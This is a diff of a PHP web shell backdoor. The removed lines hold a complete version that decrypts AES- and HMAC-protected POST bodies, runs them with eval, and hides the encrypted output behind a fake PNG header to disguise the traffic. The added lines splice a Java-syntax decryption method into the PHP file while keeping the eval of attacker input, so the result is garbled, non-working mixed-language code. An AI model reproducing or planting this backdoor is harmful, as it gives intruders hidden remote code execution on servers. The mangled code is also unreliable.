@@ -1,77 +1,46 @@
 <?php
-@session_start();
 @error_reporting(0);
-@ini_set('display_errors', '0');
-
-function Decrypt($data) {
-    $prefixLen = 68;
-    if (strlen($data) <= $prefixLen + 48) {
-        return "";
-    }
-    $encrypted = substr($data, $prefixLen);
+private byte[] Decrypt(byte[] data) throws Exception
+{
+    int prefixLen = 68;
+    byte[] encrypted = new byte[data.length - prefixLen];
+    System.arraycopy(data, prefixLen, encrypted, 0, encrypted.length);
+    String key = "__KEY__";
+    byte[] raw = key.getBytes("UTF-8");
     
-    $key = "__KEY__";
-    $raw = unpack('C*', $key);
-    $raw = $raw ? array_values($raw) : [];
-    $rawLen = count($raw);
-    if ($rawLen === 0) return "";
-    
-    $aesKey = "";
-    for ($i = 0; $i < 16; $i++) {
-        $aesKey .= chr($raw[$i % $rawLen] ^ 0x1F);
+    byte[] aesKey = new byte[16];
+    for (int i = 0; i < 16; i++) {
+        aesKey[i] = (byte) (raw[i % raw.length] ^ 0x1F);
     }
     
-    $iv = substr($encrypted, 0, 16);
-    $tag = substr($encrypted, -32);
-    $body = substr($encrypted, 16, -32);
+    javax.crypto.spec.SecretKeySpec sk = new javax.crypto.spec.SecretKeySpec(aesKey, "AES");
     
-    $macData = $iv . $body;
-    $check = hash_hmac('sha256', $macData, $aesKey, true);
-    if ($check !== $tag) {
-        header("HTTP/1.1 500 Internal Server Error");
-        exit();
+    byte[] iv = new byte[16];
+    System.arraycopy(encrypted, 0, iv, 0, 16);
+    
+    byte[] tag = new byte[32];
+    System.arraycopy(encrypted, encrypted.length - 32, tag, 0, 32);
+    
+    byte[] body = new byte[encrypted.length - 48];
+    System.arraycopy(encrypted, 16, body, 0, body.length);
+    
+    javax.crypto.Mac mac = javax.crypto.Mac.getInstance("HmacSHA256");
+    mac.init(sk);
+    
+    java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
+    out.write(iv);
+    out.write(body);
+    byte[] check = mac.doFinal(out.toByteArray());
+    
+    if (!java.security.MessageDigest.isEqual(check, tag))
+    {
+        throw new Exception("bad mac");
     }
     
-    return openssl_decrypt($body, 'AES-128-CBC', $aesKey, OPENSSL_RAW_DATA, $iv);
+    javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES/CBC/PKCS5Padding");
+    cipher.init(javax.crypto.Cipher.DECRYPT_MODE, sk, new javax.crypto.spec.IvParameterSpec(iv));
+    return cipher.doFinal(body);
 }
-
-function Encrypt($data) {
-    $key = "__KEY__";
-    $raw = unpack('C*', $key);
-    $raw = $raw ? array_values($raw) : [];
-    $rawLen = count($raw);
-    if ($rawLen === 0) return "";
-    
-    $aesKey = "";
-    $ivStr = "";
-    for ($i = 0; $i < 16; $i++) {
-        $aesKey .= chr($raw[$i % $rawLen] ^ 0x1F);
-        $ivStr .= chr($raw[$i % $rawLen] ^ 0x2E);
-    }
-    
-    $enc = openssl_encrypt($data, 'AES-128-CBC', $aesKey, OPENSSL_RAW_DATA, $ivStr);
-    $macData = $ivStr . $enc;
-    $tag = hash_hmac('sha256', $macData, $aesKey, true);
-    
-    $prefix = base64_decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=");
-    
-    return $prefix . $ivStr . $enc . $tag;
-}
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $postData = file_get_contents("php://input");
-    if (!empty($postData)) {
-        $deMsg = Decrypt($postData);
-        if (!empty($deMsg)) {
-            ob_start();
-            try {
-                @eval($deMsg);
-            } catch (\Throwable $e) {
-            }
-            $output = ob_get_contents();
-            ob_end_clean();
-            echo Encrypt($output);
-        }
-    }
-}
+$post=Decrypt(file_get_contents("php://input"));
+@eval($post);
 ?>
